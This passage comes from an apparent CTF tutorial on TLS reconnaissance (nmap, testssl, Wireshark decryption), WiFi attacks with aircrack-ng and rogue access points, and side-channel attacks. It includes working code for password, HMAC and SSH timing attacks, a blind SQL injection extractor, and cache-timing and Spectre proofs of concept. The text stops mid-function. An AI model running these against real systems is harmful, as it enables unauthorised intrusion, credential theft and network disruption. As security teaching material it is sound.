- Identify protocol-level weaknesses for exploitation
- Extract detailed certificate chains for trust analysis
- Detect HSTS, HPKP, and other security header misconfigurations
- Identify cipher preference for man-in-the-middle scenarios

**Important considerations:**

- [Inference] `testssl.sh` relies on OpenSSL libraries; results may vary based on installed OpenSSL version
- Some tests require specific OpenSSL versions or patches
- Scanning may trigger IDS/IPS alerts on monitored networks

---

### nmap --script ssl-*

Nmap's NSE (Nmap Scripting Engine) includes numerous scripts for SSL/TLS enumeration and vulnerability detection, prefixed with `ssl-*`.

**Basic syntax:**

```bash
nmap --script ssl-<script-name> [options] <target>
```

**Available SSL scripts:**

```bash
# List all SSL-related scripts
ls /usr/share/nmap/scripts/ssl-*

# Common SSL scripts:
# ssl-cert - Retrieves certificate information
# ssl-cert-intaddr - Detects private IP addresses in certificates
# ssl-ccs-injection - Tests for CCS injection vulnerability
# ssl-dh-params - Extracts Diffie-Hellman parameters
# ssl-enum-ciphers - Enumerates supported cipher suites
# ssl-heartbleed - Tests for Heartbleed vulnerability
# ssl-known-key - Checks for known private keys
# ssl-poodle - Tests for POODLE vulnerability
# ssl-date - Retrieves server time from TLS handshake
```

**Common command combinations:**

```bash
# Run all SSL scripts
nmap --script ssl-* -p 443 example.com

# Enumerate ciphers with strength grading
nmap --script ssl-enum-ciphers -p 443 example.com

# Extract certificate details
nmap --script ssl-cert -p 443 example.com

# Extract certificate with additional metadata
nmap --script ssl-cert --script-args ssl-cert.full=true -p 443 example.com

# Test for Heartbleed
nmap --script ssl-heartbleed -p 443 example.com

# Check Diffie-Hellman parameters (weak DH detection)
nmap --script ssl-dh-params -p 443 example.com

# Detect CCS injection vulnerability
nmap --script ssl-ccs-injection -p 443 example.com

# Test for POODLE
nmap --script ssl-poodle -p 443 example.com

# Check for known compromised keys
nmap --script ssl-known-key -p 443 example.com

# Detect private IP addresses in certificates (information disclosure)
nmap --script ssl-cert-intaddr -p 443 example.com

# Multiple ports
nmap --script ssl-enum-ciphers -p 443,8443,9443 example.com

# Scan entire subnet
nmap --script ssl-cert -p 443 192.168.1.0/24

# Combine with service detection
nmap -sV --script ssl-* -p 443 example.com

# Output to file
nmap --script ssl-* -p 443 example.com -oA ssl-scan-results
```

**Script-specific arguments:**

```bash
# ssl-enum-ciphers: Specify TLS version
nmap --script ssl-enum-ciphers --script-args tls.version=TLSv1.2 -p 443 example.com

# ssl-cert: Get full certificate chain
nmap --script ssl-cert --script-args ssl-cert.full=true -p 443 example.com

# ssl-heartbleed: Extract memory dump
nmap --script ssl-heartbleed --script-args vulns.showall -p 443 example.com
```

**Output interpretation:**

- **ssl-enum-ciphers**: Provides letter grades (A-F) for cipher strength per TLS version
- **ssl-cert**: Shows certificate validity, issuer, subject, SANs, public key algorithm
- **ssl-dh-params**: Flags weak DH parameters (< 2048 bits)
- **ssl-heartbleed**: Returns `VULNERABLE` status if exploitable

**CTF applications:**

- Quick reconnaissance of SSL/TLS services across multiple hosts
- Batch certificate extraction for subdomain discovery
- Automated vulnerability scanning for Heartbleed, POODLE, CCS injection
- Weak cipher identification for targeted exploitation
- Integration with other Nmap scripts for comprehensive service enumeration

**Platform considerations:**

- Scripts use Nmap's own SSL/TLS implementation; less comprehensive than `testssl.sh`
- May produce different results than specialized tools
- Effective for initial reconnaissance; follow up with dedicated tools

---

### wireshark (packet capture)

Wireshark is a network protocol analyzer that captures and decodes network traffic in real-time. For SSL/TLS analysis, it can decrypt traffic (with proper keys), analyze handshakes, and identify protocol anomalies.

**Installation and basic usage:**

```bash
# Install on Kali (usually pre-installed)
sudo apt install wireshark

# Launch GUI
wireshark

# Launch with specific interface
wireshark -i eth0

# Capture to file (command-line)
tshark -i eth0 -w capture.pcap

# Capture with SSL/TLS filter
tshark -i eth0 -f "tcp port 443" -w ssl-capture.pcap
```

**SSL/TLS-specific display filters:**

```
# Show all TLS/SSL traffic
ssl or tls

# TLS handshake messages only
tls.handshake

# Client Hello messages
tls.handshake.type == 1

# Server Hello messages
tls.handshake.type == 2

# Certificate messages
tls.handshake.type == 11

# Specific TLS versions
tls.record.version == 0x0303  # TLS 1.2
tls.record.version == 0x0304  # TLS 1.3
tls.record.version == 0x0300  # SSL 3.0

# Show cipher suites in Client Hello
tls.handshake.ciphersuite

# Alert messages (errors, warnings)
tls.alert_message

# Application data (encrypted payload)
tls.app_data

# Specific cipher suite (example: TLS_RSA_WITH_AES_256_CBC_SHA)
tls.handshake.ciphersuite == 0x0035

# Failed handshakes or alerts
tls.alert_message.level == 2  # Fatal alerts

# SNI (Server Name Indication) field
tls.handshake.extensions_server_name
```

**Decrypting SSL/TLS traffic:**

Wireshark can decrypt TLS traffic under these conditions:

**Method 1: RSA private key (TLS 1.2 and below, no Perfect Forward Secrecy):**

```
Edit → Preferences → Protocols → TLS → RSA keys list → Add
- IP address: server IP
- Port: 443
- Protocol: http (or other)
- Key file: /path/to/private.key
```

**Method 2: Pre-Master Secret (all TLS versions, requires client cooperation):**

```bash
# Set environment variable before running browser/client
export SSLKEYLOGFILE=/path/to/keylog.txt
firefox  # or any application

# In Wireshark:
Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename
Select: /path/to/keylog.txt
```

**Method 3: Session keys from memory (post-compromise scenario):**

- Extract session keys from process memory using tools like `mimikatz` (Windows) or custom scripts
- Import into Wireshark via TLS preferences

**Command-line capture with tshark:**

```bash
# Capture TLS handshakes to file
tshark -i eth0 -f "tcp port 443" -Y "tls.handshake" -w handshakes.pcap

# Display TLS handshake summary
tshark -r capture.pcap -Y "tls.handshake" -T fields -e frame.number -e ip.src -e ip.dst -e tls.handshake.type

# Extract certificates from capture
tshark -r capture.pcap -Y "tls.handshake.certificate" -T fields -e tls.handshake.certificate > certs.txt

# Show cipher suites from Client Hello
tshark -r capture.pcap -Y "tls.handshake.type == 1" -T fields -e tls.handshake.ciphersuite

# Identify TLS versions in use
tshark -r capture.pcap -Y "tls" -T fields -e tls.record.version | sort | uniq -c

# Decrypt and display HTTP traffic (requires keys)
tshark -r capture.pcap -o "tls.keylog_file:/path/to/keylog.txt" -Y "http" -T fields -e http.request.full_uri

# Export decrypted HTTP objects
tshark -r capture.pcap -o "tls.keylog_file:/path/to/keylog.txt" --export-objects http,extracted_files/
```

**Analysis techniques for CTFs:**

**1. Passive reconnaissance:**

- Identify supported TLS versions by analyzing Server Hello responses
- Extract cipher suite preferences from handshake negotiations
- Enumerate subdomains via SNI fields in Client Hello messages

**2. Certificate extraction:**

- Right-click packet → Export Packet Bytes → Save certificate chain
- Analyze certificate metadata for OSINT (organization, email addresses, SANs)

**3. Identifying downgrades:**

- Compare Client Hello offered ciphers vs. Server Hello selected cipher
- Detect potential man-in-the-middle attacks forcing weak ciphers

**4. Protocol anomaly detection:**

- Look for malformed handshakes (invalid sequence of messages)
- Identify renegotiation attempts
- Spot unusual alert messages indicating exploitation attempts

**5. Timing analysis:**

- Measure time between handshake phases for side-channel analysis
- Identify padding oracle vulnerabilities through response timing patterns

**CTF applications:**

- Decrypt captured traffic with obtained private keys or session logs
- Extract credentials from decrypted HTTP traffic within TLS
- Analyze custom TLS implementations for protocol flaws
- Identify information leakage in certificates (internal IPs, hostnames)
- Detect weak cipher negotiations for cryptographic attacks
- Capture and replay session tickets or session IDs

**Platform considerations:**

- **Linux**: Native support; can capture on any interface with proper permissions
- **Windows**: Requires WinPcap/Npcap driver installation
- Decryption requires either server private key or client-side key logging
- [Unverified] TLS 1.3 decryption always requires `SSLKEYLOGFILE`; RSA key method does not work due to mandatory Perfect Forward Secrecy

---

### aircrack-ng (wireless)

`aircrack-ng` is a suite of tools for assessing WiFi network security. While primarily focused on WEP/WPA/WPA2 cracking, it's relevant to SSL/TLS in CTF contexts where wireless networks protect access to SSL/TLS services or where wireless handshakes involve certificate-based authentication (WPA2-Enterprise/EAP-TLS).

**Suite components:**

- **airmon-ng**: Enable monitor mode on wireless interfaces
- **airodump-ng**: Capture wireless packets and handshakes
- **aireplay-ng**: Inject packets, deauthenticate clients
- **aircrack-ng**: Crack WEP/WPA/WPA2 keys from captures
- **airdecap-ng**: Decrypt WEP/WPA captures with known keys
- **airolib-ng**: Manage and precompute WPA/WPA2 rainbow tables

**Basic workflow:**

**1. Enable monitor mode:**

```bash
# Check wireless interfaces
iwconfig

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Verify (interface typically becomes wlan0mon)
iwconfig
```

**2. Scan for networks:**

```bash
# Scan all channels
sudo airodump-ng wlan0mon

# Scan specific channel
sudo airodump-ng --channel 6 wlan0mon

# Scan specific BSSID
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 wlan0mon

# Write captures to file
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write capture wlan0mon
```

**3. Capture handshakes:**

```bash
# Passive capture (wait for client connection)
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write capture wlan0mon

# Active capture (deauthenticate client to force reconnection)
# In separate terminal:
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Verify handshake capture (look for "WPA handshake" in airodump-ng output)
```

**4. Crack WPA/WPA2 PSK:**

```bash
# Dictionary attack
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Specify ESSID if multiple networks in capture
sudo aircrack-ng -w wordlist.txt -e "NetworkName" capture-01.cap

# With specific BSSID
sudo aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

**5. Decrypt traffic with known key:**

```bash
# Decrypt WPA2 capture
airdecap-ng -e "NetworkName" -p password capture-01.cap

# This creates capture-01-dec.cap with decrypted traffic
# Open in Wireshark to analyze SSL/TLS sessions
```

**SSL/TLS-specific applications in wireless contexts:**

**WPA2-Enterprise (802.1X/EAP-TLS):**

WPA2-Enterprise networks use certificate-based authentication where clients present certificates to RADIUS servers over TLS tunnels. Relevant attack vectors:

**1. Certificate extraction from captures:**

```bash
# Capture EAP-TLS authentication
sudo airodump-ng --channel 6 --write eap-capture wlan0mon

# Open in Wireshark, filter:
eap or eapol or radius

# Extract certificates from TLS handshake within RADIUS packets
# Navigate to: EAP → TLS → Handshake → Certificate
# Right-click → Export Packet Bytes
```

**2. Rogue AP attacks to capture credentials:**

```bash
# Create fake AP with hostapd-wpe (included in Kali)
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# This logs challenged/response pairs and certificates
# Captured data in: /var/log/hostapd-wpe.log
```

**3. Analyze certificate validation:**

- [Inference] Misconfigured clients may not properly validate RADIUS server certificates
- Evil twin attacks can present invalid certificates to test client validation

**SSL/TLS over decrypted WiFi:**

Once WiFi is decrypted, analyze SSL/TLS traffic passing through the network:

```bash
# Decrypt WiFi capture
airdecap-ng -e "NetworkName" -p password capture.cap

# Analyze with Wireshark
wireshark capture-dec.cap

# Filter for SSL/TLS
tls or ssl

# Extract SSL/TLS sessions to analyze separately
tshark -r capture-dec.cap -Y "tls" -w tls-only.pcap
```

**CTF scenarios:**

**Scenario 1: WPA2 crack → SSL/TLS decryption:**

1. Crack WiFi password with `aircrack-ng`
2. Decrypt WiFi traffic with `airdecap-ng`
3. Extract SSL/TLS sessions from decrypted traffic
4. If TLS session keys available (client-side access), fully decrypt application data

**Scenario 2: EAP-TLS certificate extraction:**

1. Capture 802.1X authentication handshake
2. Extract client/server certificates from EAP-TLS exchange
3. Analyze certificates for information disclosure (usernames, domains, misconfigurations)
4. Attempt certificate-based attacks if private keys are weak or leaked

**Scenario 3: Evil twin with certificate analysis:**

1. Create rogue AP mimicking target network
2. Present invalid/self-signed certificate to connecting clients
3. Identify clients that connect without proper validation
4. [Inference] Such clients may be vulnerable to man-in-the-middle attacks on other SSL/TLS services

**Command reference for wireless packet injection:**

```bash
# Test injection capability
sudo aireplay-ng --test wlan0mon

# Deauthentication (force handshake capture)
sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon  # Continuous
sudo aireplay-ng --deauth 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon  # Targeted

# Fake authentication (for old WEP networks)
sudo aireplay-ng --fakeauth 0 -a <BSSID> -h <YOUR_MAC> wlan0mon

# ARP replay (for WEP cracking, generates IVs)
sudo aireplay-ng --arpreplay -b <BSSID> -h <YOUR_MAC> wlan0mon
```

**Platform considerations:**

- **Linux-only**: Aircrack-ng suite requires Linux kernel wireless drivers with monitor mode and packet injection support
- **Compatible chipsets**: Atheros, Ralink, Realtek (RTL8812AU/RTL8814AU recommended for modern standards)
- [Unverified] Some newer WiFi 6 (802.11ax) adapters have limited monitor mode support
- **Not applicable on Windows**: Native Windows drivers don't support monitor mode; WSL cannot access hardware directly

**Important legal and ethical note:** [Inference] Using aircrack-ng and related tools against networks without explicit authorization is illegal in most jurisdictions. CTF scenarios should only involve networks you own or have written permission to test.

---

## Related Subtopics

For comprehensive SSL/TLS exploitation in CTFs, consider exploring:

- **Certificate analysis and forgery**: OpenSSL command-line utilities for certificate manipulation
- **Protocol downgrade attacks**: Techniques forcing servers to use weak TLS versions
- **Padding oracle attacks**: Exploiting CBC mode implementations (POODLE, Lucky13)
- **Man-in-the-middle frameworks**: `mitmproxy`, `bettercap`, `sslsplit` for active interception
- **TLS cipher exploitation**: Specific attacks on RC4, DES, export ciphers

---

# SIDE-CHANNEL ATTACKS

## Timing Attacks

### Execution Time Variation

Execution time variation timing attacks exploit measurable differences in processing time based on secret data or internal algorithm states. These attacks target implementations where execution paths differ depending on cryptographic key values, password characters, or internal computational branches.

**Core Principles:**

Timing attacks succeed when:

- Conditional branches depend on secret data
- Operations complete in variable time based on input
- Early-exit conditions reveal partial information
- String comparison functions process byte-by-byte

**Basic Timing Measurement:**

```bash
# Command-line timing with 'time'
time curl https://target.com/api/login -d "password=test123"

# High-precision timing with 'perf'
perf stat curl https://target.com/api/login -d "password=test123"

# Multiple iterations for statistical significance
for i in {1..100}; do
    (time curl -s https://target.com/api/login -d "password=test$i") 2>&1 | grep real
done

# Python timing script
python3 << 'EOF'
import time
import requests

def measure_request(password):
    start = time.perf_counter()
    r = requests.post('https://target.com/api/login', 
                     data={'password': password})
    end = time.perf_counter()
    return end - start

# Test multiple passwords
for pwd in ['test123', 'admin', 'password']:
    elapsed = measure_request(pwd)
    print(f"{pwd}: {elapsed:.6f} seconds")
EOF
```

**Statistical Timing Analysis:**

```python
import time
import statistics
import requests

def timing_attack(url, passwords, iterations=50):
    results = {}
    
    for password in passwords:
        times = []
        for _ in range(iterations):
            start = time.perf_counter()
            try:
                response = requests.post(url, 
                                        data={'password': password},
                                        timeout=5)
            except:
                continue
            end = time.perf_counter()
            times.append(end - start)
        
        # Statistical analysis
        results[password] = {
            'mean': statistics.mean(times),
            'median': statistics.median(times),
            'stdev': statistics.stdev(times) if len(times) > 1 else 0,
            'min': min(times),
            'max': max(times)
        }
    
    # Sort by mean response time
    sorted_results = sorted(results.items(), 
                           key=lambda x: x[1]['mean'], 
                           reverse=True)
    
    for pwd, stats in sorted_results:
        print(f"{pwd}: mean={stats['mean']:.6f}s, "
              f"stdev={stats['stdev']:.6f}s")
    
    return results

# Example usage
passwords = ['pass' + str(i) for i in range(10)]
timing_attack('http://target.com/login', passwords)
```

**Byte-by-Byte Password Timing Attack:**

```python
import time
import requests
import string

def byte_timing_attack(url, max_length=20):
    """
    Exploits implementations that compare strings character-by-character
    and exit early on mismatch
    """
    charset = string.ascii_lowercase + string.digits
    found_password = ""
    
    for position in range(max_length):
        best_char = None
        max_time = 0
        
        print(f"[*] Testing position {position}")
        
        for char in charset:
            test_password = found_password + char
            test_password += 'a' * (max_length - len(test_password))
            
            # Multiple measurements for accuracy
            times = []
            for _ in range(20):
                start = time.perf_counter()
                requests.post(url, 
                            data={'password': test_password},
                            timeout=2)
                elapsed = time.perf_counter() - start
                times.append(elapsed)
            
            avg_time = sum(times) / len(times)
            
            if avg_time > max_time:
                max_time = avg_time
                best_char = char
        
        if best_char:
            found_password += best_char
            print(f"[+] Found character: {best_char} -> {found_password}")
        else:
            break
    
    return found_password

# Usage
password = byte_timing_attack('http://target.com/check')
print(f"[!] Recovered password: {password}")
```

**HMAC Timing Attack:**

```python
import hmac
import hashlib
import time

def vulnerable_verify(message, signature, key):
    """
    Vulnerable HMAC verification - byte-by-byte comparison
    """
    expected = hmac.new(key, message, hashlib.sha256).digest()
    
    if len(signature) != len(expected):
        return False
    
    # VULNERABLE: early exit on mismatch
    for i in range(len(expected)):
        if signature[i] != expected[i]:
            return False
    return True

def secure_verify(message, signature, key):
    """
    Secure HMAC verification - constant time comparison
    """
    expected = hmac.new(key, message, hashlib.sha256).digest()
    return hmac.compare_digest(signature, expected)

# Timing attack demonstration
def timing_attack_hmac(url, message):
    """
    Recover HMAC signature byte-by-byte
    """
    signature = bytearray(32)  # SHA256 produces 32 bytes
    
    for position in range(32):
        best_byte = 0
        max_time = 0
        
        for byte_val in range(256):
            signature[position] = byte_val
            
            times = []
            for _ in range(10):
                start = time.perf_counter()
                requests.post(url, 
                            json={'message': message,
                                  'signature': signature.hex()})
                elapsed = time.perf_counter() - start
                times.append(elapsed)
            
            avg_time = sum(times) / len(times)
            
            if avg_time > max_time:
                max_time = avg_time
                best_byte = byte_val
        
        signature[position] = best_byte
        print(f"[+] Position {position}: 0x{best_byte:02x}")
    
    return signature.hex()
```

**Remote Timing Attack with Timing-Safe Requests:**

```python
import time
import socket
import statistics

def precise_timing_attack(host, port, path, iterations=100):
    """
    Low-level socket timing for more precise measurements
    """
    results = []
    
    for _ in range(iterations):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            # Connect timing
            connect_start = time.perf_counter()
            sock.connect((host, port))
            connect_time = time.perf_counter() - connect_start
            
            # Request timing
            request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
            
            send_start = time.perf_counter()
            sock.sendall(request.encode())
            
            # Receive response
            response = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if b"\r\n\r\n" in response:
                    break
            
            total_time = time.perf_counter() - send_start
            results.append(total_time)
            
        finally:
            sock.close()
        
        time.sleep(0.01)  # Small delay between requests
    
    return {
        'mean': statistics.mean(results),
        'median': statistics.median(results),
        'stdev': statistics.stdev(results),
        'samples': results
    }

# Usage
stats = precise_timing_attack('target.com', 443, '/api/verify')
print(f"Mean: {stats['mean']:.6f}s, StdDev: {stats['stdev']:.6f}s")
```

**SSH Timing Attack (Username Enumeration):**

```bash
# Time SSH authentication attempts
for user in admin root test user; do
    echo -n "$user: "
    time ssh -o ConnectTimeout=2 $user@target.com exit 2>&1 | grep real
done

# Python implementation
python3 << 'EOF'
import paramiko
import time

def ssh_timing_attack(host, usernames, port=22):
    results = {}
    
    for username in usernames:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        times = []
        for _ in range(10):
            start = time.perf_counter()
            try:
                client.connect(host, port=port, 
                             username=username, 
                             password='invalid',
                             timeout=5,
                             look_for_keys=False,
                             allow_agent=False)
            except:
                pass
            elapsed = time.perf_counter() - start
            times.append(elapsed)
        
        results[username] = sum(times) / len(times)
        print(f"{username}: {results[username]:.4f}s")
    
    return results

usernames = ['admin', 'root', 'user', 'test', 'invalid']
ssh_timing_attack('target.com', usernames)
EOF
```

**SQL Injection Timing Attack:**

```python
import requests
import time

def sql_timing_injection(url, param, query_template):
    """
    Boolean-based blind SQL injection using timing
    """
    def test_condition(condition):
        # BENCHMARK or SLEEP functions for time delay
        payload = f"{query_template.format(condition)}"
        
        start = time.perf_counter()
        requests.get(url, params={param: payload}, timeout=30)
        elapsed = time.perf_counter() - start
        
        return elapsed
    
    # Test if timing attack is viable
    baseline = test_condition("1=1")  # True condition
    delay = test_condition("1=2 AND SLEEP(5)")  # False with delay
    
    if delay > baseline + 4:  # 5 second delay minus variance
        print("[+] Timing-based SQL injection possible")
        return True
    return False

# MySQL timing payload example
url = "http://target.com/search"
template = "' OR IF({},SLEEP(5),0)-- "

# Extract data bit by bit
def extract_data(url, param, query):
    result = ""
    for position in range(1, 100):
        for char_val in range(32, 127):
            condition = f"ASCII(SUBSTRING(({query}),{position},1))={char_val}"
            payload = f"' OR IF({condition},SLEEP(3),0)-- "
            
            start = time.perf_counter()
            requests.get(url, params={param: payload}, timeout=10)
            elapsed = time.perf_counter() - start
            
            if elapsed > 2.5:
                result += chr(char_val)
                print(f"[+] Character {position}: {chr(char_val)}")
                break
        else:
            break
    
    return result
```

**CTF-Specific Tools:**

```bash
# Timing attack automation with timing-attack.py
git clone https://github.com/ffleming/timing_attack.git
cd timing_attack
pip3 install -r requirements.txt

python3 timing_attack.py --url http://target.com/verify \
                         --param token \
                         --length 32

# Using httpie with timing
for i in {1..100}; do
    time http POST target.com/api/check password="test$i"
done | grep real | awk '{print $2}' | sort -n
```

### Cache Timing

Cache timing attacks exploit CPU cache behavior to infer secret information. These attacks measure cache hit/miss latencies to determine which memory addresses were accessed, potentially revealing cryptographic keys, accessed data, or execution paths.

**Core Cache Timing Concepts:**

Modern CPUs use hierarchical caches (L1, L2, L3). Cache timing attacks exploit:

- **Cache hits**: Data in cache, fast access (~1-4 cycles)
- **Cache misses**: Data not in cache, slow access (~100-300 cycles)
- **Shared caches**: Multiple processes/cores share L3 cache
- **Cache lines**: Typically 64 bytes, granularity of cache operations

**Prime+Probe Attack:**

```c
// cache_timing.c - Basic cache timing framework
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

#define CACHE_LINE_SIZE 64
#define ARRAY_SIZE 256

uint8_t array[ARRAY_SIZE * CACHE_LINE_SIZE];
uint8_t temp = 0;

// High-precision timing using RDTSC
static inline uint64_t rdtsc() {
    unsigned int lo, hi;
    __asm__ volatile ("rdtsc" : "=a" (lo), "=d" (hi));
    return ((uint64_t)hi << 32) | lo;
}

// Flush cache line
static inline void flush(void *p) {
    _mm_clflush(p);
    _mm_mfence();
}

// Measure access time
uint64_t measure_access_time(void *addr) {
    uint64_t start, end;
    volatile uint8_t *p = (volatile uint8_t *)addr;
    
    start = rdtsc();
    temp = *p;
    end = rdtsc();
    
    return end - start;
}

// Prime+Probe implementation
void prime_cache() {
    for (int i = 0; i < ARRAY_SIZE; i++) {
        flush(&array[i * CACHE_LINE_SIZE]);
    }
}

void probe_cache(uint64_t *timings) {
    for (int i = 0; i < ARRAY_SIZE; i++) {
        timings[i] = measure_access_time(&array[i * CACHE_LINE_SIZE]);
    }
}

int main() {
    uint64_t timings[ARRAY_SIZE];
    
    // Prime
    prime_cache();
    
    // Victim accesses some secret index
    temp = array[42 * CACHE_LINE_SIZE];
    
    // Probe
    probe_cache(timings);
    
    // Analyze
    for (int i = 0; i < ARRAY_SIZE; i++) {
        if (timings[i] < 100) {  // Cache hit threshold
            printf("Cache hit at index %d (timing: %lu)\n", i, timings[i]);
        }
    }
    
    return 0;
}
```

Compile and run:

```bash
gcc -O2 -march=native cache_timing.c -o cache_timing
./cache_timing
```

**Flush+Reload Attack:**

```c
// flush_reload.c
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

#define THRESHOLD 80  // Cycles threshold for cache hit

static inline uint64_t rdtsc() {
    unsigned int lo, hi;
    __asm__ volatile ("rdtsc" : "=a" (lo), "=d" (hi));
    return ((uint64_t)hi << 32) | lo;
}

static inline void flush(void *p) {
    _mm_clflush(p);
    _mm_mfence();
}

uint64_t reload_and_measure(void *addr) {
    uint64_t start, end;
    volatile char *p = (volatile char *)addr;
    
    start = rdtsc();
    (void)*p;
    _mm_mfence();
    end = rdtsc();
    
    return end - start;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <file_to_monitor>\n", argv[0]);
        return 1;
    }
    
    // Map file into memory
    int fd = open(argv[1], O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    
    off_t size = lseek(fd, 0, SEEK_END);
    void *mapped = mmap(NULL, size, PROT_READ, MAP_SHARED, fd, 0);
    
    if (mapped == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
    
    printf("Monitoring file: %s\n", argv[1]);
    printf("Watching for cache hits (threshold: %d cycles)\n\n", THRESHOLD);
    
    // Main monitoring loop
    while (1) {
        // Flush
        for (off_t offset = 0; offset < size; offset += 64) {
            flush((char *)mapped + offset);
        }
        
        usleep(10000);  // Wait 10ms
        
        // Reload and measure
        for (off_t offset = 0; offset < size; offset += 64) {
            uint64_t time = reload_and_measure((char *)mapped + offset);
            
            if (time < THRESHOLD) {
                printf("Cache hit at offset %ld (time: %lu cycles)\n", 
                       offset, time);
            }
        }
    }
    
    munmap(mapped, size);
    close(fd);
    return 0;
}
```

**Spectre-style Cache Attack:**

```c
// spectre_cache.c - Speculative execution cache attack
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include <string.h>

#define CACHE_LINE_SIZE 64
#define ARRAY_SIZE 256

uint8_t array[ARRAY_SIZE * CACHE_LINE_SIZE];
uint8_t secret[] = "SecretData123";
uint8_t temp = 0;

void flush_array() {
    for (int i = 0; i < ARRAY_SIZE; i++) {
        _mm_clflush(&array[i * CACHE_LINE_SIZE]);
    }
    _mm_mfence();
}

uint64_t measure_access(int index) {
    uint64_t start, end;
    volatile uint8_t *addr = &array[index * CACHE_LINE_SIZE];
    
    start = __rdtsc();
    temp = *addr;
    _mm_mfence();
    end = __rdtsc();
    
    return end - start;
}

// Victim function with bounds check
uint8_t victim_function(size_t x) {
    if (x < sizeof(secret)) {
        // Training: x is usually within bounds
        // Attack: x is out of bounds, speculatively executed
        return array[secret[x] * CACHE_LINE_SIZE];
    }
    return 0;
}

int main() {
    size_t malicious_x = (size_t)(secret - (uint8_t *)array);
    
    printf("Secret address: %p\n", (void *)secret);
    printf("Array address: %p\n", (void *)array);
    printf("Malicious offset: %zu\n\n", malicious_x);
    
    // Extract secret byte by byte
    for (size_t byte_pos = 0; byte_pos < sizeof(secret) - 1; byte_pos++) {
        int results[256] = {0};
        
        // Multiple attempts for reliability
        for (int attempt = 0; attempt < 1000; attempt++) {
            // Flush array
            flush_array();
            
            // Train branch predictor (in-bounds accesses)
            for (int j = 0; j < 10; j++) {
                victim_function(j % sizeof(secret));
            }
            
            // Attack with out-of-bounds access
            flush_array();
            _mm_mfence();
            
            // Speculatively access secret
            victim_function(malicious_x + byte_pos);
            
            // Probe cache
            for (int i = 0; i < 256; i++) {
                uint64_t time = measure_access(i);
                if (time < 80) {
                    results[i]++;
                }
            }
        }
        
        // Find most frequent cache hit
        int max_hits = 0;
        int best_guess = 0;
        for (int i = 1; i < 256; i++) {  // Skip 0
            if (results[i] > max_hits) {
                max_hits = results[i];
                best_guess = i;
            }
        }
        
        printf("Byte %zu: '%c' (0x%02x, confidence: %d/1000)\n",
               byte_pos, best_guess, best_guess, max_hits);
    }
    
    return 0;
}
```

**Mastik Toolkit for Cache Attacks:**

```bash
# Install Mastik
git clone https://github.com/0xADE1A1DE/Mastik.git
cd Mastik
make

# Flush+Reload demo
./demo/FR-1-file-trace /path/to/shared/library

# Prime+Probe demo
./demo/PP-gnupg

# Generate report
./demo/FR-gnupg | ./tools/aggregate
```

**CacheQuery Tool:**

```bash
# Install dependencies
apt-get install linux-tools-common linux-tools-generic

# Enable perf events
echo -1 | sudo tee /proc/sys/kernel/perf_event_paranoid

# Monitor cache events
perf stat -e cache-references,cache-misses,cycles,instructions \
    -p <target_pid> sleep 10

# Detailed cache monitoring
perf record -e cache-misses -p <target_pid> -o cache_trace.data
perf report -i cache_trace.data
```

**Python-based Cache Timing Framework:**

```python
import ctypes
import time
import statistics

# Load C library for RDTSC
libc = ctypes.CDLL(None)

class CacheTiming:
    def __init__(self, threshold=100):
        self.threshold = threshold
        self.array = bytearray(256 * 64)  # 256 cache lines
    
    def measure_access(self, index):
        """
        [Inference] This Python implementation provides approximate timing.
        For precise cache timing, use C with RDTSC instructions.
        """
        addr = ctypes.addressof((ctypes.c_char * len(self.array)).from_buffer(self.array))
        offset = index * 64
        
        start = time.perf_counter_ns()
        _ = self.array[offset]
        end = time.perf_counter_ns()
        
        return end - start
    
    def flush_array(self):
        """Attempt to flush cache by accessing different memory"""
        dummy = bytearray(1024 * 1024)  # 1MB
        for i in range(0, len(dummy), 64):
            dummy[i] = 0
    
    def prime_probe_attack(self, victim_function):
        # Prime: access all cache lines
        for i in range(256):
            _ = self.array[i * 64]
        
        # Victim executes
        victim_index = victim_function()
        
        # Probe: measure access times
        timings = {}
        for i in range(256):
            self.flush_array()
            timing = self.measure_access(i)
            timings[i] = timing
        
        # Find cache hits
        hits = [i for i, t in timings.items() if t < self.threshold]
        return hits

# Example usage
def victim_access():
    """Simulated victim that accesses secret index"""
    secret_index = 42
    cache = CacheTiming()
    _ = cache.array[secret_index * 64]
    return secret_index

ct = CacheTiming()
detected = ct.prime_probe_attack(victim_access)
print(f"Detected cache hits at indices: {detected}")
```

**AES T-table Cache Timing Attack:**

```python
import time
import statistics

def aes_cache_timing_attack(encryption_function, known_plaintext):
    """
    Attack AES implementations using T-tables by measuring cache timing
    """
    timing_data = {}
    
    # For each possible key byte
    for key_byte_guess in range(256):
        timings = []
        
        # Multiple measurements
        for _ in range(100):
            # Flush cache (system-specific)
            flush_cache()
            
            # Measure encryption time
            start = time.perf_counter()
            ciphertext = encryption_function(known_plaintext, key_byte_guess)
            elapsed = time.perf_counter() - start
            
            timings.append(elapsed)
        
        timing_data[key_byte_guess] = {
            'mean': statistics.mean(timings),
            'stdev': statistics.stdev(timings)
        }
    
    # Analyze timing differences
    sorted_by_time = sorted(timing_data.items(), 
                           key=lambda x: x[1]['mean'])
    
    # Key bytes causing more cache misses typically take longer
